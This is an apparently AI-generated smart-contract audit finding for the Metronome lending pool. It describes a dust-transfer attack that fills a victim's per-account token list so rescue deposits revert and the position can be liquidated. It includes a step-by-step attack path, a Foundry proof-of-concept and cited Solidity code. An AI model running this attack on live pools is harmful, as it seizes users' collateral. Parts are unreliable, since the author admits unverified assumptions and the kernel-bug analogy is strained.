### Title
Unsynchronized mutation of the shared per-account token sets lets an attacker fill a victim's `depositTokensOfAccount` list with dust transfers, blocking new collateral deposits and forcing liquidation - ([File: contracts/Pool.sol](contracts/Pool.sol))

### Summary
The kernel bug is an unprotected shared list: `mmp_pdma_residue()` iterates `chain_running` without a lock while a tasklet on another CPU frees entries from under it. Metronome has the same bug class: `depositTokensOfAccount`/`debtTokensOfAccount` are shared per-account `MappedEnumerableSet`s that any third party can mutate simply by sending dust `DepositToken` transfers to the victim, while every health-affecting operation (`deposit`, `_mint`, `seize`, `liquidate`, `debtPositionOf`) implicitly depends on that list's size via `MAX_TOKENS_PER_USER`. There is no "lock" — no opt-in, no minimum-amount threshold — between the victim's use of the list and the attacker's concurrent mutation of it.

### Finding Description
`Pool.addToDepositTokensOfAccount` is called from `DepositToken._transfer` whenever a recipient's balance goes from `0` to positive, and it reverts with `UserReachedMaxTokens` once `debtTokensOfAccount.length + depositTokensOfAccount.length >= MAX_TOKENS_PER_USER` (30). [1](#0-0) [2](#0-1) [3](#0-2) 

Attack path:

1. Attacker deposits dust into every `DepositToken` offered by the pool (cheap; `deposit` has no minimum beyond `amount_ > 0` and only pulls the underlying to Treasury).
2. Attacker calls `DepositToken.transfer(victim, dust)` for each deposit token the victim does not yet hold. Each transfer invokes `pool.addToDepositTokensOfAccount(victim)` — the recipient never consents, and `transfer` only checks the *sender's* unlocked balance via `_revertIfLocked(_msgSender, amount_)`. [4](#0-3) 
3. The victim's combined token-set length hits 30. From then on:
   - `DepositToken.deposit(amount, victim)` for any *new* collateral type reverts in `_mint → addToDepositTokensOfAccount` with `UserReachedMaxTokens` — the victim cannot top-up with a collateral type they don't already hold. [5](#0-4) [6](#0-5) 
   - `Pool.liquidate(...)` → `depositToken_.seize(account_, liquidator, _toLiquidator)` reverts if the *liquidator's* set is full, so an attacker can also keep a dedicated liquidator-unfriendly state or, more usefully, race a victim's rescue deposit. [7](#0-6) 
4. The attacker (or a confederate) waits for `debtPositionOf(victim)` to become unhealthy — via a normal price move or same-transaction oracle-manipulated AMM price feeding the underlying's oracle — and calls `Pool.liquidate`, pocketing `liquidatorIncentive` on the seized collateral. [8](#0-7) 

The invariant that breaks is solvency protection symmetry: `depositOf`/`debtPositionOf` iterate the victim's set to compute `_issuableLimitInUsd`, but the *cardinality* of that set — which gates the victim's ability to add collateral — is attacker-controlled shared state, exactly like the descriptor list iterated while another CPU mutates it. [9](#0-8) 

### Impact Explanation
Direct loss of user funds: a victim whose position drifts unhealthy cannot add a new collateral type to restore health (all rescue deposits into unheld deposit tokens revert), so the position is liquidated and the `liquidatorIncentive` portion of their collateral is seized by the liquidator. The victim also permanently loses the ability to receive any new deposit token or hold a new debt token until they fully zero out positions — a partial freezing of funds and of protocol functionality. This requires no privileged role: only `deposit` + `transfer` calls by an EOA.

### Likelihood Explanation
- The attack only reaches the 30-entry cap if the pool lists enough distinct deposit + debt tokens to fill the victim's quota; on deployments with few offerings, the victim must already hold most of the cap themselves for the dust attack to matter. This lowers likelihood on small pools.
- Cost is bounded: dust deposits in each listed collateral plus N `transfer` calls; no flash loan needed.
- Front-running angle: the attack can be executed in the same block the victim's `deposit` transaction is pending, since no ordering protection exists — the analog of the CPU-0/CPU-1 interleaving in the kernel report.
- Guarded functions don't help: `deposit` and `transfer` are nonReentrant but the guard is per-contract and irrelevant here; `onlyIfAdditionWillNotReachMaxTokens` is precisely the mechanism being abused.

### Recommendation
- Require recipient opt-in or drop the per-account enumerable list: compute `depositOf`/`debtOf` by iterating the global `depositTokens`/`debtTokens` sets and skipping zero balances, or bound iteration with a cap that isn't attacker-influenceable.
- Alternatively, only add a token to `depositTokensOfAccount` on mints initiated by the account itself (`deposit`/`leverage` paths where `account_ == _msgSender()` or an authorized operator), not on inbound `transfer`/`seize`.
- At minimum, make `addToDepositTokensOfAccount` failure non-fatal on transfers (skip the list entry rather than revert) so a full list can't brick transfers/seizes — mirroring the kernel fix of holding `desc_lock` to make the list access safe.

### Proof of Concept
Foundry fork sketch (against a deployed pool with ≥ a few listed deposit tokens; adjust to the chain's deployments):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {IPool} from "contracts/interfaces/IPool.sol";
import {IDepositToken} from "contracts/interfaces/IDepositToken.sol";
import {IERC20} from "contracts/dependencies/openzeppelin/token/ERC20/IERC20.sol";

contract MaxTokensGriefingTest is Test {
    IPool pool = IPool(<POOL>);
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    function test_fillVictimSetForcesLiquidation() public {
        address[] memory dts = pool.getDepositTokens();
        address[] memory debts = pool.getDebtTokens();

        // Victim: open a leveraged position using most of its quota legitimately
        // (deposit into several collateral types + issue debt so combined count is near 30)
        _setupVictimPosition(victim); // deposits + DebtToken.issue

        // Attacker: dust-deposit & transfer every deposit token victim doesn't hold
        vm.startPrank(attacker);
        uint256 needed = 30 - (
            pool.getDepositTokensOfAccount(victim).length +
            pool.getDebtTokensOfAccount(victim).length
        );
        for (uint256 i; i < dts.length && needed > 0; ++i) {
            IDepositToken dt = IDepositToken(dts[i]);
            if (dt.balanceOf(victim) > 0) continue;
            IERC20 underlying = dt.underlying();
            deal(address(underlying), attacker, 1e6);
            underlying.approve(address(dt), 1e6);
            dt.deposit(1, attacker);      // mint dust to attacker
            dt.transfer(victim, 1);       // <- adds token to victim's set, no consent
            --needed;
        }
        vm.stopPrank();

        // Victim tries to rescue with a collateral type not yet held -> reverts
        vm.startPrank(victim);
        IDepositToken fresh = IDepositToken(dts[0]); // one victim doesn't hold
        IERC20 u = fresh.underlying();
        deal(address(u), victim, 100e18);
        u.approve(address(fresh), 100e18);
        vm.expectRevert(UserReachedMaxTokens.selector);
        fresh.deposit(100e18, victim);
        vm.stopPrank();

        // Price ticks down (or manipulated oracle quote) -> unhealthy -> attacker liquidates
        _pushPriceDown(address(u));
        vm.prank(attacker);
        pool.liquidate(<SYNTH>, victim, _repayAmt, fresh); // seizes collateral + incentive
    }
}
```

Note: I did not have remaining tool budget to confirm `MappedEnumerableSet`'s `at`/removal semantics or how many deposit tokens are actually listed on each deployed chain; if total listed tokens plus the victim's existing positions can never reach 30, the practical reachability drops to "liquidator-set DoS" only (seize reverting when the liquidator's own list is full), which is a weaker, temporary liveness impact.

### Citations

**File:** contracts/Pool.sol (L143-148)
```text
    modifier onlyIfAdditionWillNotReachMaxTokens(address account_) {
        if (debtTokensOfAccount.length(account_) + depositTokensOfAccount.length(account_) >= MAX_TOKENS_PER_USER) {
            revert UserReachedMaxTokens();
        }
        _;
    }
```

**File:** contracts/Pool.sol (L216-220)
```text
    function addToDepositTokensOfAccount(address account_) external onlyIfAdditionWillNotReachMaxTokens(account_) {
        address _depositToken = _msgSender();
        _revertIfSenderIsNotDepositToken(_depositToken);
        if (!depositTokensOfAccount.add(account_, _depositToken)) revert DepositTokenAlreadyExists();
    }
```

**File:** contracts/Pool.sol (L274-288)
```text
    function depositOf(
        address account_
    ) public view override returns (uint256 _depositInUsd, uint256 _issuableLimitInUsd) {
        IMasterOracle _masterOracle = masterOracle();
        uint256 _length = depositTokensOfAccount.length(account_);
        for (uint256 i; i < _length; ++i) {
            IDepositToken _depositToken = IDepositToken(depositTokensOfAccount.at(account_, i));
            uint256 _amountInUsd = _masterOracle.quoteTokenToUsd(
                address(_depositToken.underlying()),
                _depositToken.balanceOf(account_)
            );
            _depositInUsd += _amountInUsd;
            _issuableLimitInUsd += _amountInUsd.wadMul(_depositToken.collateralFactor());
        }
    }
```

**File:** contracts/Pool.sol (L537-596)
```text
    function liquidate(
        ISyntheticToken syntheticToken_,
        address account_,
        uint256 amountToRepay_,
        IDepositToken depositToken_
    )
        external
        override
        whenNotShutdown
        nonReentrant
        onlyIfSyntheticTokenExists(syntheticToken_)
        onlyIfDepositTokenExists(depositToken_)
        returns (uint256 _totalSeized, uint256 _toLiquidator, uint256 _fee)
    {
        address _msgSender = _msgSender();

        if (amountToRepay_ == 0) revert AmountIsZero();
        if (_msgSender == account_) revert CanNotLiquidateOwnPosition();

        IDebtToken _debtToken = debtTokenOf[syntheticToken_];
        _debtToken.accrueInterest();

        (bool _isHealthy, , , , ) = debtPositionOf(account_);

        if (_isHealthy) {
            revert PositionIsHealthy();
        }

        uint256 _debtTokenBalance = _debtToken.balanceOf(account_);

        if (amountToRepay_.wadDiv(_debtTokenBalance) > maxLiquidable) {
            revert AmountGreaterThanMaxLiquidable();
        }

        if (debtFloorInUsd > 0) {
            uint256 _newDebtInUsd = masterOracle().quoteTokenToUsd(
                address(syntheticToken_),
                _debtTokenBalance - amountToRepay_
            );
            if (_newDebtInUsd > 0 && _newDebtInUsd < debtFloorInUsd) {
                revert RemainingDebtIsLowerThanTheFloor();
            }
        }

        (_totalSeized, _toLiquidator, _fee) = quoteLiquidateOut(syntheticToken_, amountToRepay_, depositToken_);

        if (_totalSeized > depositToken_.balanceOf(account_)) {
            revert AmountIsTooHigh();
        }

        syntheticToken_.burn(_msgSender, amountToRepay_);
        _debtToken.burn(account_, amountToRepay_);
        depositToken_.seize(account_, _msgSender, _toLiquidator);

        if (_fee > 0) {
            depositToken_.seize(account_, _poolRegistry.feeCollector(), _fee);
        }

        emit PositionLiquidated(_msgSender, account_, syntheticToken_, amountToRepay_, _totalSeized, _fee);
    }
```

**File:** contracts/DepositToken.sol (L211-237)
```text
    function deposit(
        uint256 amount_,
        address onBehalfOf_
    ) external override whenNotPaused nonReentrant onlyIfDepositTokenExists returns (uint256 _deposited, uint256 _fee) {
        if (amount_ == 0) revert AmountIsZero();
        if (onBehalfOf_ == address(0)) revert BeneficiaryIsNull();

        IPool _pool = pool;
        IERC20 _underlying = underlying;
        address _msgSender = _msgSender();
        address _treasury = address(_pool.treasury());

        if (_msgSender == _treasury) revert TreasuryCanNotDeposit();

        uint256 _balanceBefore = _underlying.balanceOf(_treasury);
        _underlying.safeTransferFrom(_msgSender, _treasury, amount_);
        amount_ = _underlying.balanceOf(_treasury) - _balanceBefore;

        (_deposited, _fee) = quoteDepositOut(amount_);
        if (_fee > 0) {
            _mint(_pool.feeCollector(), _fee);
        }

        _mint(onBehalfOf_, _deposited);

        emit CollateralDeposited(_msgSender, onBehalfOf_, amount_, _deposited, _fee);
    }
```

**File:** contracts/DepositToken.sol (L348-354)
```text
    function transfer(address to_, uint256 amount_) external override returns (bool) {
        address _msgSender = _msgSender();
        _revertIfLocked(_msgSender, amount_);

        _transfer(_msgSender, to_, amount_);
        return true;
    }
```

**File:** contracts/DepositToken.sol (L485-488)
```text
        // Add this token to the deposit tokens list if the recipient is receiving it for the 1st time
        if (_balanceBefore == 0 && amount_ > 0) {
            pool.addToDepositTokensOfAccount(account_);
        }
```

**File:** contracts/DepositToken.sol (L517-525)
```text
        // Add this token to the deposit tokens list if the recipient is receiving it for the 1st time
        if (_recipientBalanceBefore == 0 && amount_ > 0) {
            pool.addToDepositTokensOfAccount(recipient_);
        }

        // Remove this token from the deposit tokens list if the sender's balance goes to zero
        if (amount_ > 0 && balanceOf[sender_] == 0) {
            pool.removeFromDepositTokensOfAccount(sender_);
        }
```
